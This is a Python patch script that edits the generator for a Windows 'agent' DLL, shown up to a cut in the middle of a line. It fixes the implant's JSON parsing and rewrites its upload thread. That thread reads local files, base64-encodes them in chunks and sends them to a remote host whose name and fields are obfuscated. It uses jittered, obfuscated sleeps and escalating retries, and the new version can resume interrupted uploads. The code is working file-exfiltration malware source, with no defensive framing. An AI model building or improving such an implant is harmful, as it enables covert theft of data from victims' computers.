with open('C:/agent-workspace/generate_agent_dll.py', 'r', encoding='utf-8') as f:
    content = f.read()

# Fix 1: add stdlib.h
content = content.replace(
    '#include <stdarg.h>',
    '#include <stdarg.h>\n#include <stdlib.h>'
)

# Fix 2: replace _json_field
old_json = '''static char* _json_field(const char* json, const char* key) {{
    static char buf[4096];
    size_t klen = strlen(key);
    const char* p = json;
    while(*p) {{
        p = strchr(p, '"'); if(!p) return NULL; p++;
        if(strncmp(p, key, klen) == 0 && p[klen] == '"') {{
            p += klen + 1; if(*p == '"') p++; while(*p && (*p == ' ' || *p == ':')) p++;
            if(*p != '"') return NULL; p++;
            size_t i = 0;
            while(*p && *p != '"' && i < sizeof(buf)-1) {{ buf[i++] = *p; p++; }}
            buf[i] = '\0'; return buf;
        }}
    }}
    return NULL;
}}'''

new_json = '''static char* _json_field(const char* json, const char* key) {{
    static char buf[4096];
    std::string j(json);
    std::string k(1, (char)34);
    k += key;
    k += (char)34;
    size_t pos = j.find(k);
    if(pos == std::string::npos) return NULL;
    size_t start = pos + k.length();
    if(start < j.length() && j[start] == (char)34) start++;
    while(start < j.length() && (j[start] == ' ' || j[start] == ':')) start++;
    if(start >= j.length() || j[start] != (char)34) return NULL;
    start++;
    size_t i = 0;
    while(start < j.length() && j[start] != (char)34 && i < sizeof(buf)-1) {{ buf[i++] = j[start++]; }}
    buf[i] = 0; return buf;
}}'''

content = content.replace(old_json, new_json)

# Fix 3: replace _up
old_up = '''static void _up(_uj* job) {{
    _log("upload thread started for %s", job->filepath.c_str());
    HANDLE hFile = CreateFileA(job->filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {{ _log("upload: cannot open %s", job->filepath.c_str()); return; }}
    LARGE_INTEGER fs; GetFileSizeEx(hFile, &fs);
    LONGLONG total = fs.QuadPart;
    char sbn[64]; {{ char* p = strrchr((char*)job->filepath.c_str(), '\\'); s_copy(sbn, _e_s_empty, sizeof(_e_s_empty)); strcat(sbn, p ? p+1 : job->filepath.c_str()); }}
    char host[256]; s_copy(host, _e_host, sizeof(_e_host));
    char fcg[32]; s_copy(fcg, _e_field_guid, sizeof(_e_field_guid));
    char fcf[32]; s_copy(fcf, _e_field_filename, sizeof(_e_field_filename));
    char fct[32]; s_copy(fct, _e_field_total_size, sizeof(_e_field_total_size));
    char pui[64]; s_copy(pui, _e_path_upload_init, sizeof(_e_path_upload_init));
    char puc[64]; s_copy(puc, _e_path_upload_chunk, sizeof(_e_path_upload_chunk));
    _log("upload init_body: %s", init_body.c_str());
    std::string init_body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fct) + "\\":" + std::to_string(total) + "}}";
    std::string resp = _http_json(host, pui, init_body);
    _log("upload init resp: %s", resp.c_str());
    bool inited = false;
    if(!resp.empty()) {{
        char* st = _json_field(resp.c_str(), "status");
        char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
        if(st && strcmp(st, sok) == 0) inited = true;
    }}
    if(!inited) {{ CloseHandle(hFile); _log("upload: init failed"); return; }}
    _log("upload: started %s (%lld bytes)", sbn, total);
    LONGLONG offset = 0;
    int retry_count = 0;
    while(offset < total) {{
        DWORD to_read = (total - offset > (LONGLONG)CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)(total - offset);
        std::vector<BYTE> buf(to_read);
        DWORD read = 0;
        if(!ReadFile(hFile, buf.data(), to_read, &read, NULL) || read == 0) break;
        std::string chunk_b64 = base64_encode(std::string((char*)buf.data(), read));
        char fco[32]; s_copy(fco, _e_field_offset, sizeof(_e_field_offset));
        char fcc[32]; s_copy(fcc, _e_field_chunk_b64, sizeof(_e_field_chunk_b64));
        std::string body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fco) + "\\":" + std::to_string(offset) + ",\\"" + std::string(fcc) + "\\":\\"" + chunk_b64 + "\\"}}";
        resp = _http_json(host, puc, body);
        bool ok = false;
        if(!resp.empty()) {{
            char* st = _json_field(resp.c_str(), "status");
            char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
            if(st && strcmp(st, sok) == 0) ok = true;
        }}
        if(ok) {{
            offset += read; retry_count = 0;
        }} else {{
            retry_count++;
            int sleep_ms = 5000;
            if(retry_count > 5) sleep_ms = 10000;
            if(retry_count > 10) sleep_ms = 30000;
            if(retry_count > 20) sleep_ms = 60000;
            if(retry_count > 30) sleep_ms = 300000;
            _sleep_obf(sleep_ms); continue;
        }}
        _sleep_obf({UPLOAD_BASE} + (rand() % {UPLOAD_JIT}));
    }}
    CloseHandle(hFile);
}}'''

new_up = '''static void _up(_uj* job) {{
    _log("upload thread started for %s", job->filepath.c_str());
    HANDLE hFile = CreateFileA(job->filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {{ _log("upload: cannot open %s", job->filepath.c_str()); return; }}
    LARGE_INTEGER fs; GetFileSizeEx(hFile, &fs);
    LONGLONG total = fs.QuadPart;
    size_t bn_pos = job->filepath.find_last_of("/\\\\");
    std::string basename = (bn_pos != std::string::npos) ? job->filepath.substr(bn_pos + 1) : job->filepath;
    char sbn[256]; s_copy(sbn, _e_s_empty, sizeof(_e_s_empty)); strncat(sbn, basename.c_str(), sizeof(sbn)-1);
    char host[256]; s_copy(host, _e_host, sizeof(_e_host));
    char fcg[32]; s_copy(fcg, _e_field_guid, sizeof(_e_field_guid));
    char fcf[32]; s_copy(fcf, _e_field_filename, sizeof(_e_field_filename));
    char fct[32]; s_copy(fct, _e_field_total_size, sizeof(_e_field_total_size));
    char pui[64]; s_copy(pui, _e_path_upload_init, sizeof(_e_path_upload_init));
    char puc[64]; s_copy(puc, _e_path_upload_chunk, sizeof(_e_path_upload_chunk));
    std::string init_body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fct) + "\\":" + std::to_string(total) + "}}";
    _log("upload init_body: %s", init_body.c_str());
    std::string resp = _http_json(host, pui, init_body);
    _log("upload init resp: %s", resp.c_str());
    bool inited = false;
    LONGLONG offset = 0;
    if(!resp.empty()) {{
        char* st = _json_field(resp.c_str(), "status");
        char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
        if(st && strcmp(st, sok) == 0) {{
            inited = true;
            char* off_str = _json_field(resp.c_str(), "offset");
            if(off_str) offset = strtoll(off_str, NULL, 10);
        }}
    }}
    if(!inited) {{ CloseHandle(hFile); _log("upload: init failed"); return; }}
    if(offset > 0) {{
        LARGE_INTEGER off; off.QuadPart = offset;
        if(!SetFilePointerEx(hFile, off, NULL, FILE_BEGIN)) {{
            _log("upload: seek failed"); CloseHandle(hFile); return;
        }}
        _log("upload: resuming from offset %lld", offset);
    }}
    _log("upload: started %s (%lld bytes)", sbn, total);
    int retry_count = 0;
    while(offset < total) {{
        DWORD to_read = (total - offset > (LONGLONG)CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)(total - offset);
        std::vector<BYTE> buf(to_read);
        DWORD read = 0;
        if(!ReadFile(hFile, buf.data(), to_read, &read, NULL) || read == 0) break;
        std::string chunk_b64 = base64_encode(std::string((char*)buf.data(), read));
        char fco[32]; s_copy(fco, _e_field_offset, sizeof(_e_field_offset));
        char fcc[32]; s_copy(fcc, _e_field_chunk_b64, sizeof(_e_field_chunk_b64));
        std::string body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fco) + "\\":" + s
